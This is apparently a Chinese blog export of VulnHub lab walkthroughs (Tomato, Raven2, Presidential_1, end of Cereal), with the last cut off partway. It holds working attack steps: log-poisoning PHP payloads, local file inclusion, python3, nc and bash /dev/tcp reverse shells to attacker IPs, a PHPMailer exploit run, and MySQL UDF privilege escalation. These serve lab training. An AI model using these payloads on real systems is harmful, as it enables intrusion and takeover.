<p>读取flag： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /hoem/rocky/local.txt</span><br><span class="line">aaa87365bf3dc0c1a82aa14b4ce26bbc</span><br><span class="line"></span><br><span class="line">2. /root/flag.txt</span><br><span class="line">Well done! You have completed Cereal.</span><br><span class="line"></span><br><span class="line">  ____                    _ </span><br><span class="line"> / ___|___ _ __ ___  __ _| |</span><br><span class="line">| |   / _ \ &#x27;__/ _ \/ _` | |</span><br><span class="line">| |__|  __/ | |  __/ (_| | |</span><br><span class="line"> \____\___|_|  \___|\__,_|_|</span><br><span class="line">                            </span><br><span class="line"></span><br><span class="line">This box was brought to you by Bootlesshacker.</span><br><span class="line"></span><br><span class="line">Follow me on Twitter: @bootlesshacker</span><br><span class="line">My website: https://www.bootlesshacker.com</span><br><span class="line"></span><br><span class="line">Root Flag: 1aeb5db4e979543cb807cfd90df77763</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机的难度在于两点：</p>
<ol type="1">
<li>在web渗透的时候，两个端口，并且需要设置hosts，还涉及到子域名，最费时间的是路径扫描要使用比较大的字典，否则扫不出来；</li>
<li>权限提升的时候常规可利用的点都无法使用，虽然本质上还是通过cron来提权，但是需要找到存在这么一个脚本也是不简单的；</li>
<li>还有Linux
软链接的知识点也很重要，否则即使知道存在chown.sh脚本，也不知道怎么利用；</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>路径爆破</tag>
        <tag>域名解析</tag>
        <tag>子域名爆破</tag>
        <tag>匿名ftp</tag>
        <tag>进程监视</tag>
        <tag>linux软链接</tag>
        <tag>crontab利用</tag>
      </tags>
  </entry>
  <entry>
    <title>22 Vulnhub Tomato Writeup</title>
    <url>/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度比较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/tomato-1,557/">Tomato: 1 ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到1个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>路径扫描</li>
<li>源码分析</li>
<li><strong>文件包含</strong></li>
<li><strong>写入日志</strong></li>
<li><strong>内核漏洞枚举</strong></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.26</span><br><span class="line">sudo nmap -p21,80,2211,8888 -A 10.0.2.26</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505182423.png" /></p>
<p>信息如下：</p>
<ol type="1">
<li>21是ftp服务，但是不允许匿名登录</li>
<li>80和8888都是http服务</li>
<li>2211是ssh服务</li>
</ol>
<h2 id="http服务-get-shell">2.2. http服务 + get shell</h2>
<h3 id="http服务">2.2.1. http服务</h3>
<p>虽然我后访问的8888端口，但是那个端口需要认证，而即使我拿特别大的字典也无法爆破成功，因为放弃了。</p>
<p>直接访问80端口，发现只有一张图片，因此进行路径扫描：
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.26/ -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></p>
<p>除了 index.html 之外，还扫描出一个目录
antibot_image，该目录下存在许多文件，但是所有的php文件都是空白，图片和txt文件没有有用的信息，只有info.php是有显示的，查看源码得到提示：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!-- &lt;/?php <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;image&#x27;</span>]; --&gt;</span><br></pre></td></tr></table></figure></p>
<p>根据提示，猜测可能存在文件包含漏洞，因此输入如下payload尝试：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?image=/etc/passwd</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183012.png" /></p>
<p>如果有远程包含那就更好了，但是很可惜，并不存在远程文件包含</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183102.png" /></p>
<p>因此，接下来优先考虑tomato的家目录下是否存在id_rsa <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?image=/home/tomato/.shh/id_rsa</span><br></pre></td></tr></table></figure></p>
<p>很遗憾，没有任何结果，但这并不意味不存在，也有可能是没有读取权限。</p>
<p>接下来利用文件包含的经典利用方式，那就是包含日志。从之前的服务发现中可以看到有ftp和ssh，那么我们远程连接这两个服务的时候就会记录到日志中，ssh的默认日志路径为:
/var/log/auth.log <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?image=/var/log/auth.log</span><br></pre></td></tr></table></figure></p>
<p>我在kali上利用ssh随便连接了一下，在日志中看到用户名被记录了下来
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Downloads]</span><br><span class="line">└─<span class="comment"># ssh sfasdfashfkashgksg@10.0.2.26 -p 2211                                                                                                                 255 ⨯</span></span><br><span class="line">sfasdfashfkashgksg@10.0.2.26<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Permission denied, please try again.</span></span><br><span class="line"><span class="string">sfasdfashfkashgksg@10.0.2.26&#x27;</span>s password: </span><br><span class="line">Permission denied, please try again.</span><br><span class="line">sfasdfashfkashgksg@10.0.2.26<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">sfasdfashfkashgksg@10.0.2.26: Permission denied (publickey,password).</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183500.png" /></p>
<h3 id="get-shell">2.2.2. get shell</h3>
<p>我们可以构造如下payload，然后ssh连接，这样子这句payload就会被记录到日志中
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php echo system($_GET[&quot;cmd&quot;])?&gt;&#x27;</span>@<span class="number">10.0</span>.<span class="number">2.26</span> -p <span class="number">2211</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505183804.png" /></p>
<p>注意到这里没有显示我们注入的payload。这是好事还是坏事呢？这是好事！如果这里显示了payload，就知道服务器只把我们的payload当作普通的文本展示出来；而不显示则说明，服务器很大可能把payload作为代码执行了。可以利用php://fliter读取一下该日志</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184055.png" /></p>
<p>尝试一下能否执行代码 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?image=/var/log/auth.log&amp;cmd=id</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184141.png" /></p>
<p>因此这里可以执行命令，那么反弹shell就很简单了，经过尝试发现：</p>
<ol type="1">
<li>nc没有-e参数，也无法使用nc串联；</li>
<li>虽然有php环境，但无法利用php反弹shell</li>
<li>存在python3，且可以利用</li>
<li>存在perl，也可以利用</li>
<li>bash配合重定向反弹shell失败</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184423.png" /></p>
<p>成功get shell。</p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>这里通过信息搜集，没有sudo和suid提权漏洞，但是内核版本比较低，经过搜索发现有许多可以利用的exp</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505184542.png" /></p>
<p>最开始我先尝试了CVE-2021-3493，居然失败了，由尝试了许多个，也都失败了（我佛了）</p>
<p>这里推荐一个自动收集可利用漏洞的工具：</p>
<ul>
<li><a
href="https://github.com/mzet-/linux-exploit-suggester.git">GitHub -
mzet-/linux-exploit-suggester: Linux privilege escalation auditing
tool</a></li>
</ul>
<p>将sh脚本传到靶机上（/tmp 目录下），给x权限并执行</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505190001.png" /></p>
<p>该工具会根据漏洞的成功的可能性排列，越靠前越有可能。因此一个一个尝试即可。尝试到第二个的时候发现成功了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505190135.png" /></p>
<p>首先确定靶机上有没有gcc，该靶机上并没有，因此在kali上编译之后再传给靶机。如果靶机有，最好就是在靶机上编译。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505190406.png" /></p>
<p>读取flag： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/root/proof.txt</span><br><span class="line">Sun_CSR_TEAM_TOMATO_JS_0232xx23</span><br></pre></td></tr></table></figure></p>
<h1 id="总结">3. 总结</h1>
<p>该靶机挺简单的，漏洞也很常见，不过还是学到了两点：</p>
<ol type="1">
<li>内核漏洞可以使用工具。随便测试太浪费时间了</li>
<li>各种语言环境都有反弹shell的命令，后期可以收集一下</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>文件包含</tag>
        <tag>写入日志</tag>
        <tag>内核漏洞枚举</tag>
      </tags>
  </entry>
  <entry>
    <title>23 Vulnhub Raven2 Writeup</title>
    <url>/2022/05/06/23%20Vulnhub%20Raven2%20Writeup/</url>
    <content><![CDATA[<p>该靶机有点恶心，我在phpmailer卡了很久。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/raven-2,269/">Raven: 2 ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>目标：</p>
<ul>
<li>获得root权限</li>
<li>拿到4个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>路径爆破</li>
<li><strong>远程代码注入</strong></li>
<li>EXP代码修改</li>
<li>反弹shell</li>
<li>内核漏洞枚举</li>
<li>本地信息收集</li>
<li><strong>MySQL UDF提权</strong></li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l </span><br><span class="line">sudo nmap -p- 10.0.2.28</span><br><span class="line">sudo nmap -p22,80,111,39505 -A 10.0.2.28</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506150958.png" /></p>
<p>这里111端口上的服务是rpcbind，这是存在漏洞的，不过是拒绝服务的漏洞，对get
shell和提权都没有帮助。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506151113.png" /></p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>在网站主页面进行功能点检测的时候发现了一个域名：raven.local，将其加入到/etc/hosts下。之后就没有其他发现了。</p>
<p>进行路径扫描： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.28/ -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506151306.png" /></p>
<p>css, fonts, img, js, manual
都没有用，vendor下面有着许多的文件，wordpress告诉我们这个网站的CMS</p>
<p>然后利用wpscan对wordpress进行了扫描，发现了两个用户 michael 和
steven，然后又找到了后台登录界面</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506151615.png" /></p>
<p>尝试爆破也没有用。wp-content和wp-includes目录下也存在着多个问价，但是都没有有用的信息。</p>
<p>接下来看最开始的vendor目录。</p>
<p>首先发现了一个 PHPMailerAutoload.php
但是php文件都被解析执行了，我们看不到其代码。但是可以搜索phpmailer，并且这具有漏洞</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506151844.png" /></p>
<p>又从 VERSION 中发现版本是
5.2.16。该漏洞的是因为调用了phpmailer的函数，所以我们需要找到是哪个文件调用了。再次进行路径扫描，这回添加了压缩拓展名，因为php的我们看不了，</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506152138.png" /></p>
<p>发现了contact.php和contact.zip，将后者下载打开，在其中发现了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506152411.png" /></p>
<p>此时可以确定是contact.php调用了phpmailer。</p>
<p>最后，从PATH文件中发现了第一个flag，以及文件路径： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/vendor/</span><br><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="get-shell">2.3. get shell</h2>
<p>这里才是最坑的。searchsplot扫描出多个漏洞，但是能利用的只有40974.py，还需要经过一定的修改才可以！！！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506153921.png" /></p>
<p>修改：</p>
<ol type="1">
<li>target</li>
<li>backdoor，默认的backdoor.php不行，不知道为什么</li>
<li>ip和端口</li>
<li>以及生成后门的路径，从PATh中知道了路径</li>
</ol>
<p>然后执行： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 40974.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ </span><br><span class="line">██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗</span><br><span class="line">███████║██╔██╗ ██║███████║██████╔╝██║     ██║   ██║██║  ██║█████╗  ██████╔╝</span><br><span class="line">██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗</span><br><span class="line">██║  ██║██║ ╚████║██║  ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║</span><br><span class="line">╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝</span><br><span class="line">      PHPMailer Exploit CVE 2016-10033 - anarcoder at protonmail.com</span><br><span class="line"> Version 1.0 - github.com/anarcoder - greetings opsxcq &amp; David Golunski</span><br><span class="line"></span><br><span class="line">[+] SeNdiNG eVIl SHeLL To TaRGeT....</span><br><span class="line">[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D</span><br><span class="line">[+]  ExPLoITeD http://10.0.2.28/contact.php</span><br></pre></td></tr></table></figure></p>
<p>先直接访问10.0.2.28/exp.php是否存在，如果存在，则在kali上开启监听，然后再次访问exp.php即可获得shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506154057.png" /></p>
<h2 id="权限提升">2.4. 权限提升</h2>
<p>介绍一款信息收集的工具：<a
href="https://github.com/rebootuser/LinEnum">GitHub -
rebootuser/LinEnum: Scripted Local Linux Enumeration &amp; Privilege
Escalation Checks</a></p>
<p>将 LinEnum.sh
传送到靶机，并执行。查看信息内容的时候发现了mysql，并且是root权限</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506154409.png" /></p>
<p>接下来查看配置信息，获得其用户名和密码</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506154952.png" /></p>
<p>查看其内容 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/** The name of the database for WordPress */</span><br><span class="line">define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;root&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&#x27;DB_PASSWORD&#x27;, &#x27;R@v3nSecurity&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>然后尝试连接MySQL，利用 system /bin/bash -i 获得shell，但是失败了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506155223.png" /></p>
<p>查看MySQL的sucure_file_priv参数，发现没有任何限制 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p>因此接下来利用UDF提权。[[Linux MySQL提权总结]]</p>
<ol type="1">
<li><p>在kali上找到so文件，注意靶机是64位的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. find / -iname <span class="string">&quot;*mysqludf*&quot;</span> -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">2. cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so ./udf.so</span><br></pre></td></tr></table></figure></li>
<li><p>将so文件传给靶机/tmp目录下，并给权限，直接777</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. 靶机: nc -lvnp 3333 &gt; udf.so</span><br><span class="line">2. kali: nc 10.0.2.28 3333 &lt; udf.so -w 1</span><br><span class="line">3. 靶机: chmod 777 udf.so</span><br></pre></td></tr></table></figure></li>
<li><p>找MySQL插件目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%plugin%&quot;;</span><br><span class="line">show variables like &quot;%plugin%&quot;;</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| Variable_name | Value                  |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| plugin_dir    | /usr/lib/mysql/plugin/ |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></li>
<li><p>将udf.so写入插件所在目录</p>
<p>失败的尝试： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select hex(load_file(&#x27;/tmp/udf.so&#x27;)) into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>成功的尝试： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. use mysql;</span><br><span class="line">2. create table shell(lint blob);</span><br><span class="line">3. insert into shell values(load_file(&#x27;/tmp/udf.so&#x27;));</span><br><span class="line">4. select * from shell into dumpfile &#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;</span><br></pre></td></tr></table></figure></p></li>
<li><p>创建自定义函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. reate function sys_eval returns integer soname &#x27;mysqludf.so&#x27;;</span><br><span class="line">2. select sys_eval(&#x27;id &gt; /tmp/out.txt&#x27;);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>如果/tmp/out.txt成功生成，并且属主为root，则代表成功</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506161609.png" /></p>
<p>即使执行函数出现了报错，还是不影响。</p>
<p>因此，直接利用该函数获得shell <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;bash -i&#x27;); # 失败，会断开连接</span><br><span class="line">select sys_eval(&#x27;nc 10.0.2.27 5555 -e /bin/bash&#x27;); # 成功</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506161923.png" /></p>
<p>接下来就可以找flag了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506162042.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// flag2.txt</span><br><span class="line">flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125;</span><br><span class="line"></span><br><span class="line">// flag3.png</span><br><span class="line">直接网页访问 http://10.0.2.28/wordpress/wp-content/uploads/2018/11/flag3.png</span><br><span class="line"></span><br><span class="line">// flag4.txt</span><br><span class="line">  ___                   ___ ___ </span><br><span class="line"> | _ \__ ___ _____ _ _ |_ _|_ _|</span><br><span class="line"> |   / _` \ V / -_) <span class="string">&#x27; \ | | | | </span></span><br><span class="line"><span class="string"> |_|_\__,_|\_/\___|_||_|___|___|</span></span><br><span class="line"><span class="string">                           </span></span><br><span class="line"><span class="string">flag4&#123;df2bc5e951d91581467bb9a2a8ff4425&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">CONGRATULATIONS on successfully rooting RavenII</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I hope you enjoyed this second interation of the Raven VM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Hit me up on Twitter and let me know what you thought: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@mccannwj / wjmccann.github.io</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>并不一定要使用nc获得shell，反正可以执行命令，也可以利用setuid.c
编译，并且给其suid权限，这样普通用户执行./setuid 就可以提权。</p>
</blockquote>
<h1 id="总结">3. 总结</h1>
<p>该靶机涉及的主要知识点：</p>
<ol type="1">
<li>phpmailer漏洞；</li>
<li>MySQL UDF提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>phpmailer漏洞</tag>
        <tag>MySQL UDF提取</tag>
      </tags>
  </entry>
  <entry>
    <title>24 Vulnhub Presidential_1 Writeup</title>
    <url>/2022/05/06/24%20Vulnhub%20Presidential_1%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度中等，感觉比较常规，虽然我也是看了writeup才最终做出来的。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a
href="https://www.vulnhub.com/entry/presidential-1,500/">Presidential: 1
~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>中</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>备份文件</li>
<li>子域名爆破</li>
<li><strong>phpmyadmin</strong></li>
<li>密码爆破</li>
<li>本地文件包含</li>
<li><strong>Capabilities</strong></li>
<li>SSH公钥认证</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.29</span><br><span class="line">sudo nmap -p80,2082 -A 10.0.2.29</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506220805.png" /></p>
<p>这里比较异常的是ssh没在22端口，而是在2082端口。</p>
<h2 id="访问http服务">2.2. 访问http服务</h2>
<p>进入网站，映入眼帘的就是美国2020总统大选</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506220922.png" /></p>
<p>注意左上角邮箱那存在域名，<strong>而在靶机中，出现域名，一般都会使用到，并且很大概率需要进行子域名扫描</strong>，因此，先将该域名加入/etc/hosts。</p>
<p>接下来进行路径扫描 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.29</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506221155.png" /></p>
<p>config.php和config.php.bak是最值得常看的，但是前者为空白，而后者在查看源码的时候出现了如下信息：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$dbUser = &quot;votebox&quot;;</span><br><span class="line">$dbPass = &quot;casoj3FFASPsbyoRP&quot;;</span><br><span class="line">$dbHost = &quot;localhost&quot;;</span><br><span class="line">$dbname = &quot;votebox&quot;;</span><br></pre></td></tr></table></figure></p>
<p>这看过去像是数据库的相关信息。</p>
<p>接着对assets目录进行查看，并没有发现任何有用的信息。然后想着换成域名再次进行路径扫描，结果和ip一样。</p>
<p>所以，最后进行子域名爆破（字典要用大一点）： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster vhost -u votenow.local -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt|grep <span class="string">&quot;Status: 200&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>最后找到一个子域名:
datasafe.votenow.local。将该子域名加入/etc/hosts，然后直接访问该域名，得到一个phpmyadmin的登陆界面，利用刚刚备份文件泄露出来的用户名和密码尝试登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506221749.png" /></p>
<p>查看了一下数据库内的信息，发现了一个用户： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">$2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i</span><br></pre></td></tr></table></figure></p>
<p>将密码字段用john爆破（时间花费很长，但是一定能跑出来）
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john --wordlist=rockyou.txt hash.txt <span class="comment"># hash.txt 保存的是密码字段</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506204239.png" /></p>
<p>即密码为：Stella。用这个账号和密码进行ssh连接，发现居然不知道密码登陆方式，只支持公钥认证。</p>
<p>接着搜索是否存在可利用的漏洞：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506221925.png" /></p>
<p>我首先尝试了一下RCE，但是没有任何反应，接下来尝试第二个，txt内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Exploit Title: phpMyAdmin 4.8.1 - Local File Inclusion to Remote Code Execution</span><br><span class="line"># Date: 2018-06-21</span><br><span class="line"># Exploit Author: VulnSpy</span><br><span class="line"># Vendor Homepage: http://www.phpmyadmin.net</span><br><span class="line"># Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz</span><br><span class="line"># Version: 4.8.0, 4.8.1</span><br><span class="line"># Tested on: php7 mysql5</span><br><span class="line"># CVE : CVE-2018-12613</span><br><span class="line"></span><br><span class="line">1. Run SQL Query : select &#x27;&lt;?php phpinfo();exit;?&gt;&#x27;</span><br><span class="line">2. Include the session file :</span><br><span class="line">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</span><br></pre></td></tr></table></figure></p>
<p>简单来说就是phpmyadmin的4.8.1存在本地文件包含，利用该漏洞包含session文件，然后get
shell。</p>
<h2 id="get-shell">2.3. get shell</h2>
<p>首先，先执行sql语句： <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();exit;?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506222156.png" /></p>
<p>然后查看session的值（在cookie里面）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506222229.png" /></p>
<p>接着，包含session所在文件，这里就是该靶机的一个大坑，那就是要把sessions改成session！！！
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_vh95pitq4hv51ijj1b6g83o8afetposj</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506222507.png" /></p>
<p>可以看到phpinfo被成功执行。</p>
<p>那么，我们构造如下反弹shell的paylaod： <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php system(&quot;bash -i &gt;&amp; /dev/tcp/10.0.2.27/4444 0&gt;&amp;1&quot;); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220506222959.png" /></p>
<p>kali监听444端口，浏览器再次访问之前的session文件。session会过期的，如果原来的session文件不能反弹shell，可以查看session是否改变了，一般来说没这么快，只有重新登陆的时候才会改变</p>
<blockquote>
